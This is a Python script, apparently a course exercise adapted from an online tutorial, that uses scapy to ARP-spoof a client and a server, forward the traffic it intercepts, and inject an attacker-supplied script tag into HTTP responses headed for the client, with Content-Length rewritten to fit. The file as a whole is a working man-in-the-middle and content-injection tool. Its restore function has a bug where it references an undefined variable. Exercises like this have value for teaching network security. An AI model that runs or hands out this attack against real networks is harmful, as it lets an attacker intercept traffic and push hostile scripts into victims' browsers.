# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()

def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()

# TODO: returns the mac address for an IP
def mac(IP):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=IP), retry=2, timeout=5)
    for s,r in resp:
        print(r[ARP].hwsrc)
        return r[ARP].hwsrc
    return None

def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # Spoof server ARP table
        time.sleep(interval)

# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
    kwargs = {
            'op':2,
            'pdst':dst_ip,
            'psrc':src_ip,
            'hwdst':dst_mac,
            }
    if src_mac is not None:
        kwargs['hwsrc'] = src_mac
    send(ARP(**kwargs), count = 5)

# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    send(ARP(op=2, hwdst=dst_mac, pdst=dstIP, hwsrc=srcMAC, psrc=srcIP), count=5)

# TODO: handle intercepted packets
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC,script
    insert = "<script"+">"+script+"</"+"script>"+"</"+"body>"
    body = "</"+"body>"

    if IP in packet:
        if packet[Ether].src==attackerMAC:
            return
        elif packet[IP].dst==serverIP:
            packet2 = packet
            packet2[Ether].src = attackerMAC
            packet2[Ether].dst = serverMAC
            sendp(packet2)
        elif packet[IP].dst==clientIP:
            packet2 = packet
            packet2[Ether].src = attackerMAC
            packet2[Ether].dst = clientMAC 
            if packet.haslayer(Raw):
                temp = packet2[Raw].load.decode("utf-8")
                if re.search("(?:Content-Length:\s)(\d*)",temp) is not None:
                    length = re.search("(?:Content-Length:\s)(\d*)",temp).group(1)
                    newlength = int(length) + len(insert)-len(body)
                    temp = temp.replace(length,str(newlength))
                temp = temp.replace(body,insert)
                packet2[Raw].load = str.encode(temp)
                print(packet2[Raw].load)
                #print(packet[Raw])
                del packet2[IP].len
                del packet2[IP].chksum
                del packet2[TCP].chksum
                sendp(packet2)
            else:
                sendp(packet2)

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)
    script = args.script

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
